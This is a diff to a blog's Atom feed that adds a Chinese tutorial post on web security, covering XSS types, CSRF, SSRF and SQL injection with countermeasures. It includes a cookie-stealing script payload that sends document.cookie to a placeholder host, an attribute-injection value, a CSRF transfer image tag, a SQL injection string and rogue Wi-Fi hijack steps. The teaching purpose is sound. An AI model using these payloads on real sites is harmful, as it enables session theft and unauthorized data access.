@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://jasonyan2015.github.io/"/>
-  <updated>2017-04-09T04:09:46.981Z</updated>
+  <updated>2017-04-11T12:50:47.106Z</updated>
   <id>https://jasonyan2015.github.io/</id>
   
   <author>
@@ -14,6 +14,146 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>前端安全：XSS和</title>
+    <link href="https://jasonyan2015.github.io/2017/04/11/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
+    <id>https://jasonyan2015.github.io/2017/04/11/前端安全/</id>
+    <published>2017-04-11T12:31:51.755Z</published>
+    <updated>2017-04-11T12:50:47.106Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“<strong>跨域</strong>”和“<strong>客户端执行</strong>”。</p>
+<p>XSS攻击分为三种</p>
+<ul>
+<li>Reflected XSS</li>
+<li>Stored XSS</li>
+<li>DOM-based or loacl XSS</li>
+</ul>
+<a id="more"></a>
+<h3 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。</p>
+<h5 id="例子，做个假设："><a href="#例子，做个假设：" class="headerlink" title="例子，做个假设："></a>例子，做个假设：</h5><ol>
+<li><p>当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。</p>
+</li>
+<li><p>在搜索框搜索内容，填入<code>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code>, 点击搜索。</p>
+</li>
+<li><p>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</p>
+</li>
+<li><p>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><code>http://www.amazon.cn/search?name=&lt;script&gt;document.location=&#39;http://xxx/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+</li>
+</ol>
+<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><p>对于一个图书馆网站book.com</p>
+<p>假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。</p>
+<p>但是如果输入<code>&lt;script&gt;alert(&#39;没有书开个毛线书店啊&#39;)&lt;/script&gt;</code>，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。</p>
+<p>既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是<a href="http://vajoy/get），那么可以这样写：" target="_blank" rel="external">http://vajoy/get），那么可以这样写：</a><br><code>&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p>不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。</p>
+<p>所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：<br><code>book.com/search?name=&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p>这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。</p>
+<h4 id="开发安全措施"><a href="#开发安全措施" class="headerlink" title="开发安全措施"></a>开发安全措施</h4><ol>
+<li><p>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</p>
+</li>
+<li><p>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</p>
+</li>
+</ol>
+<h5 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h5><p>标签：</p>
+<p><code>&lt;span&gt;&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;&lt;/span&gt;</code></p>
+<p>转义</p>
+<p><code>&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt;</code></p>
+<p>属性：</p>
+<p>如果一个input的value属性值是</p>
+<p><code>琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)</code><br>就可能出现</p>
+<p><code>&lt;input type=&quot;text&quot; value=&quot;琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)&quot;&gt;</code></p>
+<p>点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。</p>
+<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。</p>
+<h5 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h5><ol>
+<li><p>发一篇文章，里面包含了恶意脚本</p>
+<p> <code>今天天气不错啊！&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code></p>
+</li>
+<li><p>后端没有对文章进行过滤，直接保存文章内容到数据库。</p>
+</li>
+<li><p>当其他看这篇文章的时候，包含的恶意脚本就会执行。</p>
+</li>
+</ol>
+<blockquote>
+<p>因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</p>
+</blockquote>
+<h5 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h5><p>后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。</p>
+<h5 id="开发安全措施："><a href="#开发安全措施：" class="headerlink" title="开发安全措施："></a>开发安全措施：</h5><ol>
+<li><p>首要是服务端要进行过滤，因为前端的校验可以被绕过。</p>
+</li>
+<li><p>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</p>
+</li>
+</ol>
+<h3 id="DOM-based-or-local-XSS"><a href="#DOM-based-or-local-XSS" class="headerlink" title="DOM-based or local XSS"></a>DOM-based or local XSS</h3><p>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>
+<h5 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h5><ol>
+<li><p>提供一个免费的wifi。</p>
+</li>
+<li><p>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</p>
+</li>
+<li><p>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</p>
+</li>
+<li><p>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</p>
+</li>
+<li><p>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</p>
+</li>
+</ol>
+<p>这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>
+<h5 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h5><ol>
+<li><p>还是提供一个免费wifi</p>
+</li>
+<li><p>在我们电脑上进行抓包</p>
+</li>
+<li><p>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。</p>
+</li>
+</ol>
+<p><img src="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png" alt=""></p>
+<p>PS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。</p>
+<p>结论：</p>
+<p>这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。</p>
+<p>开发安全措施：</p>
+<ol>
+<li>使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li>
+</ol>
+<p>总结</p>
+<p>XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>银行网站A，它以GET请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
+<p>危险网站B，它里面有一段HTML的代码如下：</p>
+<pre><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;
+</code></pre><p>用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块……</p>
+<p>原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的<code>&lt;img&gt;</code>以<code>GET</code>的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code>，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<h2 id="其他安全问题："><a href="#其他安全问题：" class="headerlink" title="其他安全问题："></a>其他安全问题：</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。</p>
+<p>比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：</p>
+<p><code>book.com/book?id=100</code></p>
+<p>说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：</p>
+<p><code>select * from booktable where id=&#39;100&#39;</code></p>
+<p>那么如果我们把url更改为</p>
+<p><code>book.com/book?id=100&#39;or&#39;1&#39;=&#39;1</code></p>
+<p>那么数据库操作执行就变成了：</p>
+<p><code>select * from booktable where id=&#39;100&#39;or&#39;1&#39;=&#39;1&#39;</code></p>
+<p>从而取出了整个booktable 表单的全部数据。</p>
+<hr>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://www.cnblogs.com/lovesong/p/5199623.html" target="_blank" rel="external">前端安全之XSS攻击</a></li>
+<li><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">浅谈CSRF攻击方式</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;XSS攻击&quot;&gt;&lt;a href=&quot;#XSS攻击&quot; class=&quot;headerlink&quot; title=&quot;XSS攻击&quot;&gt;&lt;/a&gt;XSS攻击&lt;/h2&gt;&lt;p&gt;XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“&lt;strong&gt;跨域&lt;/strong&gt;”和“&lt;strong&gt;客户端执行&lt;/strong&gt;”。&lt;/p&gt;
+&lt;p&gt;XSS攻击分为三种&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Reflected XSS&lt;/li&gt;
+&lt;li&gt;Stored XSS&lt;/li&gt;
+&lt;li&gt;DOM-based or loacl XSS&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>CSS3媒体查询</title>
